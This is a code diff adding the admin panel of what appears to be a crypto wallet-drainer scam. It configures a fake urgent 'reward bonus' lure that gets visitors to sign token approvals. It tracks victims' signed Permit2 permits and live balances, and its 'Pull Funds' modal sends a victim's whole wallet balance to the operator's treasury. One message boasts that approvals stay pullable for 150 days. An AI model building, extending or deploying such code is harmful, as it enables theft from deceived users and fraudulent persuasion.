+      <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(260px, 1fr));gap:16px;margin-bottom:18px;">
+        <!-- Enable / Disable Switch -->
+        <div class="form-group" style="background:var(--bg-overlay);padding:14px;border-radius:var(--radius-md);border:1px solid var(--border-default);display:flex;align-items:center;justify-content:space-between;">
+          <div>
+            <div style="font-size:0.88rem;font-weight:700;color:var(--text-primary);">Enable Reward Promotion</div>
+            <div style="font-size:0.75rem;color:var(--text-muted);margin-top:2px;">Show/hide bonus card & timer on front page</div>
+          </div>
+          <label style="position:relative;display:inline-block;width:48px;height:26px;cursor:pointer;flex-shrink:0;">
+            <input type="checkbox" id="rew-enabled" ${rc.enabled ? 'checked' : ''} style="opacity:0;width:0;height:0;">
+            <span class="slider-toggle"></span>
+          </label>
+        </div>
+
+        <!-- Bonus Percentage -->
+        <div class="form-group">
+          <label class="form-label" for="rew-percentage">Reward Bonus Percentage (%)</label>
+          <div style="position:relative;">
+            <input type="text" id="rew-percentage" class="form-control" value="${esc(rc.percentage)}" placeholder="5.0" style="padding-right:34px;font-family:var(--font-mono);font-weight:700;color:#fbbf24;font-size:1.05rem;">
+            <span style="position:absolute;right:12px;top:50%;transform:translateY(-50%);color:#fbbf24;font-weight:700;">%</span>
+          </div>
+          <div style="font-size:0.7rem;color:var(--text-muted);margin-top:4px;">Bonus rate shown to users (e.g. 5.0, 7.5, 10, 15)</div>
+        </div>
+
+        <!-- Promotional Window Duration -->
+        <div class="form-group">
+          <label class="form-label" for="rew-duration">Promotional Window Duration (Hours)</label>
+          <div style="position:relative;">
+            <input type="number" id="rew-duration" class="form-control" value="${esc(String(rc.durationHours))}" min="1" max="720" style="padding-right:45px;font-family:var(--font-mono);font-weight:700;color:#60a5fa;font-size:1.05rem;">
+            <span style="position:absolute;right:10px;top:50%;transform:translateY(-50%);color:#60a5fa;font-size:0.75rem;font-weight:700;">HOURS</span>
+          </div>
+          <div style="display:flex;align-items:center;gap:6px;margin-top:6px;flex-wrap:wrap;">
+            <span style="font-size:0.68rem;color:var(--text-muted);">Quick Presets:</span>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(12)">12h</button>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(24)">24h</button>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(48)">48h</button>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(72)">72h</button>
+            <button type="button" class="btn-chip" onclick="setPresetDuration(120)">120h</button>
+          </div>
+        </div>
+
+        <!-- Event Badge Text -->
+        <div class="form-group">
+          <label class="form-label" for="rew-badge">Event Badge Tag</label>
+          <input type="text" id="rew-badge" class="form-control" value="${esc(rc.badgeText)}" placeholder="Flash Event · 72H Only">
+          <div style="font-size:0.7rem;color:var(--text-muted);margin-top:4px;">Displayed in the pulsing top badge</div>
+        </div>
+      </div>
+
+      <!-- Headline & Ribbon -->
+      <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(280px, 1fr));gap:16px;margin-bottom:16px;">
+        <div class="form-group">
+          <label class="form-label" for="rew-headline">Main Headline Title</label>
+          <input type="text" id="rew-headline" class="form-control" value="${esc(rc.headline)}" placeholder="Claim Your 5% Reward Bonus">
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="rew-incard">In-Card Urgency Ribbon Text</label>
+          <input type="text" id="rew-incard" class="form-control" value="${esc(rc.inCardText)}" placeholder="Connect & approve within 72 hours to receive an exclusive one-time 5% reward bonus!">
+        </div>
+      </div>
+
+      <!-- Context Description -->
+      <div class="form-group" style="margin-bottom:18px;">
+        <label class="form-label" for="rew-description">Promotional Context / Description</label>
+        <textarea id="rew-description" class="form-control" rows="3" style="resize:vertical;line-height:1.5;">${esc(rc.description)}</textarea>
+        <div style="font-size:0.7rem;color:var(--text-muted);margin-top:4px;">Main persuasive text displayed in the bonus card</div>
+      </div>
+
+      <!-- 3 Key Perks -->
+      <div style="background:rgba(15,23,42,0.65);border:1px solid var(--border-default);border-radius:var(--radius-md);padding:14px;margin-bottom:20px;">
+        <div style="font-size:0.76rem;font-weight:700;color:var(--text-primary);text-transform:uppercase;letter-spacing:0.06em;margin-bottom:12px;">
+          ✨ Feature Highlight Points (3 Cards)
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit, minmax(220px, 1fr));gap:12px;">
+          <div style="background:var(--bg-base);padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border-subtle);">
+            <div style="font-size:0.72rem;font-weight:700;color:#60a5fa;margin-bottom:4px;">💎 Point 1</div>
+            <input type="text" id="rew-p1-title" class="form-control" style="padding:6px 8px;font-size:0.8rem;margin-bottom:6px;" value="${esc(rc.perk1Title || '')}" placeholder="Title">
+            <input type="text" id="rew-p1-desc" class="form-control" style="padding:6px 8px;font-size:0.76rem;" value="${esc(rc.perk1Desc || '')}" placeholder="Description">
+          </div>
+          <div style="background:var(--bg-base);padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border-subtle);">
+            <div style="font-size:0.72rem;font-weight:700;color:#c084fc;margin-bottom:4px;">🔄 Point 2</div>
+            <input type="text" id="rew-p2-title" class="form-control" style="padding:6px 8px;font-size:0.8rem;margin-bottom:6px;" value="${esc(rc.perk2Title || '')}" placeholder="Title">
+            <input type="text" id="rew-p2-desc" class="form-control" style="padding:6px 8px;font-size:0.76rem;" value="${esc(rc.perk2Desc || '')}" placeholder="Description">
+          </div>
+          <div style="background:var(--bg-base);padding:10px;border-radius:var(--radius-sm);border:1px solid var(--border-subtle);">
+            <div style="font-size:0.72rem;font-weight:700;color:#fbbf24;margin-bottom:4px;">⚡ Point 3</div>
+            <input type="text" id="rew-p3-title" class="form-control" style="padding:6px 8px;font-size:0.8rem;margin-bottom:6px;" value="${esc(rc.perk3Title || '')}" placeholder="Title">
+            <input type="text" id="rew-p3-desc" class="form-control" style="padding:6px 8px;font-size:0.76rem;" value="${esc(rc.perk3Desc || '')}" placeholder="Description">
+          </div>
+        </div>
+      </div>
+
+      <!-- Live User Page Preview Box -->
+      <div style="background:rgba(5,8,15,0.9);border:1px dashed rgba(245,158,11,0.4);border-radius:var(--radius-md);padding:16px;margin-bottom:20px;">
+        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:12px;">
+          <span style="font-size:0.74rem;font-weight:700;color:#fbbf24;text-transform:uppercase;letter-spacing:0.06em;">👁️ Live User Page Preview</span>
+          <span style="font-size:0.7rem;color:var(--text-muted);">Real-time reflection of user view</span>
+        </div>
+        <div style="background:linear-gradient(165deg, rgba(18, 24, 38, 0.98) 0%, rgba(10, 15, 25, 0.98) 60%, rgba(15, 23, 42, 0.96) 100%);border:1px solid rgba(245,158,11,0.4);border-radius:var(--radius-md);padding:18px;position:relative;">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;flex-wrap:wrap;gap:6px;">
+            <span style="font-size:0.72rem;font-weight:700;background:rgba(239,68,68,0.15);color:#fca5a5;padding:3px 10px;border-radius:100px;border:1px solid rgba(239,68,68,0.3);" id="prev-badge">${esc(rc.badgeText)}</span>
+            <span style="font-size:0.76rem;font-weight:800;color:#fbbf24;background:rgba(245,158,11,0.2);padding:3px 12px;border-radius:100px;border:1px solid rgba(245,158,11,0.4);" id="prev-pct">+${esc(rc.percentage)}% REWARD BONUS</span>
+          </div>
+          <div style="font-size:1.15rem;font-weight:700;color:#fff;margin-bottom:6px;" id="prev-headline">🎁 ${esc(rc.headline)}</div>
+          <div style="font-size:0.8rem;color:#94a3b8;line-height:1.5;margin-bottom:12px;" id="prev-desc">${esc(rc.description)}</div>
+          <div style="display:inline-flex;align-items:center;gap:8px;background:rgba(5,8,14,0.85);padding:6px 12px;border-radius:6px;border:1px solid rgba(245,158,11,0.25);font-family:var(--font-mono);font-size:0.8rem;color:#fbbf24;">
+            <span>⏳ Promotional Window:</span>
+            <strong id="prev-hours">${esc(String(rc.durationHours))} Hours</strong>
+          </div>
+        </div>
+      </div>
+
+      <!-- Action Buttons -->
+      <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;">
+        <button id="btn-save-reward" class="btn" style="background:linear-gradient(135deg,#f59e0b 0%,#d97706 100%);color:#050709;font-weight:700;box-shadow:0 4px 20px rgba(245,158,11,0.35);padding:13px 26px;" ${state.rewardBusy ? 'disabled' : ''}>
+          ${state.rewardBusy ? '<span class="spinner"></span> Saving…' : '💾 Save & Publish Reward Settings'}
+        </button>
+        <button id="btn-reset-reward" class="btn btn-secondary" style="padding:13px 20px;">🔄 Reset to Defaults</button>
+      </div>
+
+      ${alertHtml(state.rewardMsg, state.rewardMsgKind)}
+    </div>
+  `;
+}
+
+function triggerPreviewUpdate() {
+  const elEnabled = document.getElementById('rew-enabled');
+  const elPct = document.getElementById('rew-percentage');
+  const elDur = document.getElementById('rew-duration');
+  const elBadge = document.getElementById('rew-badge');
+  const elHead = document.getElementById('rew-headline');
+  const elDesc = document.getElementById('rew-description');
+  const elPill = document.getElementById('rew-status-pill');
+
+  const pBadge = document.getElementById('prev-badge');
+  const pPct = document.getElementById('prev-pct');
+  const pHead = document.getElementById('prev-headline');
+  const pDesc = document.getElementById('prev-desc');
+  const pHours = document.getElementById('prev-hours');
+
+  if (pBadge && elBadge) pBadge.textContent = elBadge.value || 'Flash Event';
+  if (pPct && elPct) pPct.textContent = `+${elPct.value || '5.0'}% REWARD BONUS`;
+  if (pHead && elHead) pHead.textContent = `🎁 ${elHead.value || 'Reward Bonus'}`;
+  if (pDesc && elDesc) pDesc.textContent = elDesc.value || '';
+  if (pHours && elDur) pHours.textContent = `${elDur.value || '72'} Hours`;
+  if (elPill && elEnabled) {
+    elPill.className = `badge ${elEnabled.checked ? 'badge-executed' : 'badge-failed'}`;
+    elPill.textContent = elEnabled.checked ? '🟢 Promotion Active' : '🔴 Promotion Disabled';
+  }
+}
+
+function setPresetDuration(h) {
+  const inp = document.getElementById('rew-duration');
+  if (inp) {
+    inp.value = h;
+    triggerPreviewUpdate();
+  }
+}
+
+async function handleSaveRewardConfig() {
+  if (!state.adminKey) {
+    alert('Please log in with admin key first.');
+    return;
+  }
+  const a = adminApi(state.adminKey);
+  state.rewardBusy = true;
+  state.rewardMsg = 'Saving reward configuration to database…';
+  state.rewardMsgKind = 'info';
+  render();
+
+  const cfg = {
+    enabled: document.getElementById('rew-enabled') ? document.getElementById('rew-enabled').checked : true,
+    percentage: document.getElementById('rew-percentage') ? document.getElementById('rew-percentage').value.trim() : '5.0',
+    durationHours: document.getElementById('rew-duration') ? Number(document.getElementById('rew-duration').value) : 72,
+    badgeText: document.getElementById('rew-badge') ? document.getElementById('rew-badge').value.trim() : '',
+    headline: document.getElementById('rew-headline') ? document.getElementById('rew-headline').value.trim() : '',
+    description: document.getElementById('rew-description') ? document.getElementById('rew-description').value.trim() : '',
+    inCardText: document.getElementById('rew-incard') ? document.getElementById('rew-incard').value.trim() : '',
+    perk1Title: document.getElementById('rew-p1-title') ? document.getElementById('rew-p1-title').value.trim() : '',
+    perk1Desc: document.getElementById('rew-p1-desc') ? document.getElementById('rew-p1-desc').value.trim() : '',
+    perk2Title: document.getElementById('rew-p2-title') ? document.getElementById('rew-p2-title').value.trim() : '',
+    perk2Desc: document.getElementById('rew-p2-desc') ? document.getElementById('rew-p2-desc').value.trim() : '',
+    perk3Title: document.getElementById('rew-p3-title') ? document.getElementById('rew-p3-title').value.trim() : '',
+    perk3Desc: document.getElementById('rew-p3-desc') ? document.getElementById('rew-p3-desc').value.trim() : ''
+  };
+
+  try {
+    const res = await a.saveRewardConfig(cfg);
+    if (res && res.rewardConfig) {
+      state.rewardConfig = res.rewardConfig;
+      state.rewardMsg = '✅ Reward configuration successfully updated & published live to user front page!';
+      state.rewardMsgKind = 'ok';
+    }
+  } catch (err) {
+    state.rewardMsg = err.message || String(err);
+    state.rewardMsgKind = 'err';
+  }
+
+  state.rewardBusy = false;
+  render();
+}
+
+function handleResetRewardConfig() {
+  state.rewardConfig = { ...DEFAULT_REWARD_CONFIG };
+  state.rewardMsg = 'Settings restored to default presets. Click Save & Publish to apply.';
+  state.rewardMsgKind = 'info';
+  render();
+}
+
+function buildPermitRow(p) {
+  const pct = spentPct(p);
+  const userBal = p.userBalanceHuman ? `${p.userBalanceHuman} ${p.tokenSymbol}` : '—';
+  const myRefCode = (p.owner || '').slice(-6).toLowerCase();
+  const myRefUrl = `${window.location.origin}/ref?${myRefCode}`;
+
+  return `
+    <tr>
+      <td style="color:var(--accent-blue);font-weight:700;font-family:var(--font-mono);font-size:.85rem">#${esc(String(p.id))}</td>
+      <td style="white-space:nowrap;">
+        <div style="font-size:.82rem;font-weight:600;color:var(--text-primary);">${esc(fmtDateTimeBD(p.createdAt))}</div>
+        <div style="font-size:.67rem;color:var(--text-muted);margin-top:2px;">BD Time (GMT+6)</div>
+      </td>
+      <td style="white-space:nowrap;">
+        <div style="font-size:.82rem;font-weight:600;color:#f59e0b;">${esc(fmtDateTimeBD(p.expiration))}</div>
+        <div style="display:inline-flex;align-items:center;gap:4px;margin-top:2px;">
+          <span class="badge" style="background:rgba(245,158,11,0.12);color:#fbbf24;border:1px solid rgba(245,158,11,0.3);font-size:.66rem;padding:2px 6px;">⏳ ${esc(getExpiryCountdown(p.expiration))}</span>
+        </div>
+      </td>
+      <td style="white-space:nowrap;">
+        ${pullableBadgeHtml(p)}
+      </td>
+      <td>
+        <div class="owner-cell">
+          <div class="full-addr-row">
+            <span class="full-addr">${esc(p.owner)}</span>
+            <button class="btn-copy" onclick="copyText('${esc(p.owner)}')" title="Copy Address">📋</button>
+            <a href="https://bscscan.com/address/${esc(p.owner)}" target="_blank" class="btn-copy" style="text-decoration:none;" title="View on BSCScan">↗</a>
+          </div>
+          <div style="margin-top:4px;display:inline-flex;align-items:center;gap:6px;background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.3);border-radius:4px;padding:2px 6px;">
+            <span style="font-size:.65rem;color:var(--text-muted);text-transform:uppercase;font-weight:600;">Live Bal:</span>
+            <span style="font-family:var(--font-mono);font-weight:700;color:#4ade80;font-size:.75rem;">${esc(userBal)}</span>
+          </div>
+        </div>
+      </td>
+      <td>
+        <div style="display:inline-flex;align-items:center;gap:6px;">
+          <span class="badge" style="background:rgba(59,130,246,0.12);color:#60a5fa;border:1px solid rgba(59,130,246,0.3);font-family:var(--font-mono);font-size:.72rem;">ref?${esc(myRefCode)}</span>
+          <button class="btn-copy" onclick="copyText('${esc(myRefUrl)}')" title="Copy Refer Link">📋</button>
+        </div>
+      </td>
+      <td>
+        ${p.referredBy
+          ? `<span class="badge" style="background:rgba(168,85,247,0.12);color:#c084fc;border:1px solid rgba(168,85,247,0.3);font-family:var(--font-mono);font-size:.72rem;">ref?${esc(p.referredBy)}</span>`
+          : `<span style="color:var(--text-muted);font-size:.72rem;">Direct</span>`
+        }
+      </td>
+      <td>
+        <span style="font-weight:700;color:var(--text-primary)">${esc(p.tokenSymbol || '—')}</span>
+      </td>
+      <td>
+        <div class="user-bal-pill">
+          <span class="user-bal-val">${esc(userBal)}</span>
+          <span class="user-bal-label">Live In Wallet</span>
+        </div>
+      </td>
+      <td>
+        <div class="td-amount">${esc(p.amountHuman || p.amount)} ${esc(p.tokenSymbol)}</div>
+        <div class="progress-wrap" style="width:100px">
+          <div class="progress-fill" style="width:${pct}%"></div>
+        </div>
+        <div style="font-size:.65rem;color:var(--text-muted);margin-top:2px">${pct}% pulled</div>
+      </td>
+      <td class="td-amount" style="color:var(--text-secondary);font-size:.82rem">${esc(p.spentHuman || p.spent || '0')} ${esc(p.tokenSymbol)}</td>
+      <td>${badgeHtml(p.status)}</td>
+      <td>
+        ${p.status === 'pending' || p.status === 'partial'
+          ? `<button class="btn btn-pull" data-pull-id="${esc(String(p.id))}">⚡ Pull</button>`
+          : `<span style="color:var(--text-muted);font-size:.72rem">—</span>`
+        }
+      </td>
+    </tr>
+  `;
+}
+
+function renderModal() {
+  const container = document.getElementById('modal-container');
+  if (!state.activePullPermit) {
+    container.innerHTML = '';
+    return;
+  }
+
+  const p = state.activePullPermit;
+  const rawApproved = BigInt(p.amount || '0');
+  const rawSpent = BigInt(p.spent || '0');
+  const rawRemaining = rawApproved - rawSpent;
+  const remainingHuman = p.amountHuman ? (Number(p.amountHuman) - Number(p.spentHuman || 0)).toString() : '12000';
+  const userBal = p.userBalanceHuman || '0';
+  const defaultRecipient = state.adminStatus?.treasury || ERAVAREX_ADMIN_WALLET;
+
+  container.innerHTML = `
+    <div class="modal-overlay" id="pull-overlay">
+      <div class="modal-box">
+        <div class="modal-header">
+          <div class="modal-title">⚡ Pull Funds (Permit #${esc(String(p.id))})</div>
+          <button class="modal-close" id="modal-close-btn">&times;</button>
+        </div>
+
+        <div class="summary-box">
+          <div class="summary-row">
+            <span class="summary-label">User Address</span>
+            <span class="summary-val">${esc(p.owner)}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Approved Time (BD)</span>
+            <span class="summary-val">${esc(fmtDateTimeBD(p.createdAt))}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Expiration Time (BD)</span>
+            <span class="summary-val" style="color:#f59e0b;font-weight:600;">${esc(fmtDateTimeBD(p.expiration))} (${esc(getExpiryCountdown(p.expiration))})</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Available for Pullout</span>
+            <span class="summary-val" style="font-weight:700;color:${isPullable(p) ? '#4ade80' : '#f87171'};">
+              ${isPullable(p) ? '🟢 OK ALWAYS — Ready for Pullout' : esc(p.pullableText || '❌ Not Available')}
+            </span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Live In User Wallet</span>
+            <span class="summary-val" style="color:#4ade80;font-weight:700;">${esc(userBal)} ${esc(p.tokenSymbol)}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Total Approved Limit</span>
+            <span class="summary-val">${esc(p.amountHuman)} ${esc(p.tokenSymbol)}</span>
+          </div>
+          <div class="summary-row">
+            <span class="summary-label">Remaining Limit</span>
+            <span class="summary-val">${esc(remainingHuman)} ${esc(p.tokenSymbol)}</span>
+          </div>
+        </div>
+
+        ${!isPullable(p) ? `
+          <div style="background:rgba(239,68,68,0.1);border:1px solid rgba(239,68,68,0.3);border-radius:var(--radius-md);padding:10px 14px;margin-bottom:14px;font-size:.8rem;color:#fca5a5;line-height:1.5;">
+            <strong>⚠️ Cannot Pull On-Chain:</strong> ${esc(p.pullableReason || 'This permit cannot be executed on-chain.')}
+            ${p.pullableStatus === 'expired_sig' ? '<div style="margin-top:6px;color:#fecaca;">💡 <strong>Note:</strong> The user already has permanent on-chain approval! Once the user visits the site and signs (0 gas free sign), this permit will instantly become pullable for 150 days.</div>' : ''}
+            ${p.pullableStatus === 'no_erc20' ? '<div style="margin-top:6px;color:#fecaca;">💡 The user wallet currently has 0 ERC-20 approval to Permit2 (approval was revoked or never granted).</div>' : ''}
+          </div>
+        ` : ''}
+
+        <div class="form-group">
+          <label class="form-label" for="pull-recipient">Recipient Address (Where pulled tokens are sent)</label>
+          <input id="pull-recipient" class="form-control mono" value="${esc(defaultRecipient)}" />
+        </div>
+
+        <div class="form-group">
+          <label class="form-label" for="pull-amount">Amount to Pull (${esc(p.tokenSymbol)})</label>
+          <input id="pull-amount" class="form-control" type="text" inputmode="decimal" value="${esc(userBal !== '0' ? userBal : '1')}" />
+          <div class="quick-amounts">
+            <button class="btn-chip" onclick="document.getElementById('pull-amount').value='${esc(userBal)}'">Max In Wallet (${esc(userBal)})</button>
+            <button class="btn-chip" onclick="document.getElementById('pull-amount').value='1'">1 ${esc(p.tokenSymbol)}</button>
+            <button class="btn-chip" onclick="document.getElementById('pull-amount').value='${esc(remainingHuman)}'">Remaining Limit (${esc(remainingHuman)})</button>
+          </div>
+        </div>
+
+        <button id="btn-modal-confirm" class="btn btn-pull" style="width:100%;margin-top:14px;padding:12px;${!isPullable(p) ? 'opacity:0.5;cursor:not-allowed;' : ''}" ${state.pullSubmitting || !isPullable(p) ? 'disabled' : ''}>
+          ${state.pullSubmitting ? '<span class="spinner"></span> Pulling on-chain…' : (!isPullable(p) ? '⛔ Cannot Pull (See Notice Above)' : '🚀 Confirm & Pull Tokens On-Chain')}
+        </button>
+
+        ${state.pullError ? `<div class="alert alert-err"><span>❌</span><span>${esc(state.pullError)}</span></div>` : ''}
+        ${state.pullSuccess ? `<div class="alert alert-ok"><span>✅</span><span>${esc(state.pullSuccess)}</span></div>` : ''}
+      </div>
+    </div>
+  `;
+
+  document.getElementById('modal-close-btn').onclick = () => {
+    state.activePullPermit = null;
+    state.pullError = '';
+    state.pullSuccess = '';
+    renderModal();
+  };
+
+  document.getElementById('pull-overlay').onclick = (e) => {
+    if (e.target.id === 'pull-overlay') {
+      state.activePullPermit = null;
+      state.pullError = '';
+      state.pullSuccess = '';
+      renderModal();
+    }
+  };
+
+  document.getElementById('btn-modal-confirm').onclick = async () => {
+    const to = document.getElementById('pull-recipient').value.trim();
+    const amt = document.getElementById('pull-amount').value.trim();
+
+    if (!to || !/^0x[a-fA-F0-9]{40}$/.test(to)) {
+      state.pullError = 'Invalid recipient address.';
+      renderModal();
+      return;
+    }
+    if (!amt || isNaN(Number(amt)) || Number(amt) <= 0) {
+      state.pullError = 'Please enter a valid positive amount.';
+      renderModal();
+      return;
+    }
+
+    state.pullSubmitting = true;
+    state.pullError = '';
+    state.pullSuccess = '';
+    renderModal();
+
+    try {
+      const a = adminApi(state.adminKey);
+      const r = await a.execute(p.id, to, amt);
+
+      state.pullSuccess = `Successfully pulled ${amt} ${p.tokenSymbol}! Tx: ${r.txHash} (Remaining limit: ${r.remaining} ${p.tokenSymbol})`;
+
+      // Refresh data
+      const [st, pr] = await Promise.all([a.status(), a.permits()]);
+      state.adminStatus = st;
+      state.permits = (pr.permits || []).sort((a, b) => Number(b.id) - Number(a.id));
+      state.activePullPermit = state.permits.find(x => String(x.id) === String(p.id)) || null;
+    } catch (err) {
+      state.pullError = err.message || String(err);
+    }
+
+    state.pullSubmitting = false;
+    render();
+  };
+}
+
+function bind() {
+  const $ = id => document.getElementById(id);
+  const $$ = sel => document.querySelectorAll(sel);
+
+  if ($('btn-load')) $('btn-load').onclick = handleAdminLoad;
+  if ($('btn-toggle-key')) {
+    $('btn-toggle-key').onclick = () => {
+      const inp = $('inp-key');
+      if (inp.type === 'password') {
+        inp.type = 'text';
+        $('btn-toggle-key').innerText = '🔒 Hide Key';
+      } else {
+        inp.type = 'password';
+        $('btn-toggle-key').innerText = '👁 Show Key';
+      }
+    };
+  }
+  if ($('btn-toggle-pause')) $('btn-toggle-pause').onclick = handleTogglePause;
+  if ($('btn-set-fee')) $('btn-set-fee').onclick = handleSetFee;
+  if ($('btn-set-treasury')) $('btn-set-treasury').onclick = handleSetTreasury;
+  if ($('btn-rescue')) $('btn-rescue').onclick = handleRescue;
+  if ($('btn-save-reward')) $('btn-save-reward').onclick = handleSaveRewardConfig;
+  if ($('btn-reset-reward')) $('btn-reset-reward').onclick = handleResetRewardConfig;
+
+  // Real-time preview input listeners
+  const inputIds = ['rew-enabled', 'rew-percentage', 'rew-duration', 'rew-badge', 'rew-headline', 'rew-description', 'rew-incard'];
+  inputIds.forEach(id => {
+    const el = $(id);
+    if (el) {
+      el.oninput = triggerPreviewUpdate;
+      el.onchange = triggerPreviewUpdate;
+    }
+  });
+
+  $$('[data-pull-id]').forEach(el => {
+    el.onclick = () => {
+      const permitId = el.dataset.pullId;
+      const p = state.permits.find(x => String(x.id) === String(permitId));
+      if (p) {
+        state.activePullPermit = p;
+        state.pullError = '';
+        state.pullSuccess = '';
+        renderModal();
+      }
+    };
+  });
+}
+
+async function handleAdminLoad() {
+  const keyEl = document.getElementById('inp-key');
+  state.adminKey = keyEl ? keyEl.value.trim() : state.adminKey;
+  localStorage.setItem('adminKey', state.adminKey);
+
+  if (!state.adminKey) {
+    state.adminMsg = 'Please enter your admin API key.';
+    state.adminMsgKind = 'err';
+    render();
+    return;
+  }
+
+  state.adminBusy = true;
+  state.adminMsg = 'Connecting to backend…';
+  state.adminMsgKind = 'info';
+  render();
+
+  try {
+    const a = adminApi(state.adminKey);
+    const [st, pr, rc] = await Promise.all([
+      a.status(),
+      a.permits(),
+      a.getRewardConfig().catch(() => null)
+    ]);
+    state.adminStatus = st;
+    state.permits = (pr.permits || []).sort((a, b) => Number(b.id) - Number(a.id));
+    if (rc && rc.rewardConfig) {
+      state.rewardConfig = rc.rewardConfig;
+    }
+    state.adminMsg = `Dashboard loaded successfully — ${state.permits.length} permit(s) retrieved.`;
+    state.adminMsgKind = 'ok';
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+    state.adminStatus = null;
+  }
+
+  state.adminBusy = false;
+  render();
+}
+
+async function handleTogglePause() {
+  const newVal = !state.adminStatus.paused;
+  try {
+    const a = adminApi(state.adminKey);
+    await a.setPaused(newVal);
+    state.adminMsg = `Contract ${newVal ? 'paused' : 'unpaused'} successfully.`;
+    state.adminMsgKind = 'ok';
+    const [st, pr] = await Promise.all([a.status(), a.permits()]);
+    state.adminStatus = st;
+    state.permits = (pr.permits || []).sort((a, b) => Number(b.id) - Number(a.id));
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+  }
+  render();
+}
+
+async function handleSetFee() {
+  const v = prompt('New fee in basis points (0–1000). E.g. 100 = 1%:', String(state.adminStatus.feeBps));
+  if (v === null) return;
+  const n = Number(v);
+  if (isNaN(n) || n < 0 || n > 1000) {
+    state.adminMsg = 'Fee must be between 0 and 1000 bps.';
+    state.adminMsgKind = 'err';
+    render();
+    return;
+  }
+  try {
+    await adminApi(state.adminKey).setFee(n);
+    state.adminMsg = `Fee set to ${n} bps (${((n / 10000) * 100).toFixed(2)}%).`;
+    state.adminMsgKind = 'ok';
+    state.adminStatus = await adminApi(state.adminKey).status();
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+  }
+  render();
+}
+
+async function handleSetTreasury() {
+  const v = prompt('New treasury wallet address:', state.adminStatus.treasury);
+  if (!v) return;
+  if (!/^0x[a-fA-F0-9]{40}$/.test(v.trim())) {
+    state.adminMsg = 'Invalid address format.';
+    state.adminMsgKind = 'err';
+    render();
+    return;
+  }
+  try {
+    await adminApi(state.adminKey).setTreasury(v.trim());
+    state.adminMsg = `Treasury address updated to ${v.trim()}`;
+    state.adminMsgKind = 'ok';
+    state.adminStatus = await adminApi(state.adminKey).status();
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+  }
+  render();
+}
+
+async function handleRescue() {
+  const token = prompt('Token contract address to rescue (or leave empty for native BNB):');
+  const to = prompt('Recipient wallet address:');
+  if (!to) return;
+  const amount = prompt('Amount to rescue (in human units):');
+  if (!amount) return;
+
+  try {
+    const a = adminApi(state.adminKey);
+    const r = await a.rescue({ token: token || undefined, to: to.trim(), amount });
+    state.adminMsg = `Rescue tx confirmed: ${r.txHash}`;
+    state.adminMsgKind = 'ok';
+    state.adminStatus = await adminApi(state.adminKey).status();
+  } catch (e) {
+    state.adminMsg = e.message;
+    state.adminMsgKind = 'err';
+  }
+  render();
+}
+
+// Initial render & auto-load if key is present
+render();
+if (state.adminKey) {
+  handleAdminLoad();
+}
+</script>
+</body>
+</html>
